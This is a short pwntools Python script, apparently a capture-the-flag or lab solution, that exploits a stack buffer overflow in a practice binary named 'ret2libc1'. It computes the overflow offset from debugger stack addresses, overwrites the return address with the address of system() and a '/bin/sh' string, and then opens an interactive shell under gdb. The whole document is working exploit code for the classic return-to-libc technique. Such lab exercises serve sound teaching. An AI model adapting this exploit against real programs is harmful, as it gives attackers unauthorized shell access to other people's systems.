from pwn import *

# p = process("./ret2libc1")
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
p = gdb.debug("./ret2libc1")


esp = 0xffffcd00
ebp = 0xffffcd88
s = esp+0x1c

offset = ebp - s + 4

system = 0x08048460
bin_sh = 0x08048720
pause()
p.sendline(
    cyclic(offset) + p32(system) + cyclic(4) # 4bytes 的system返回地址
      + p32(bin_sh)
)
p.interactive()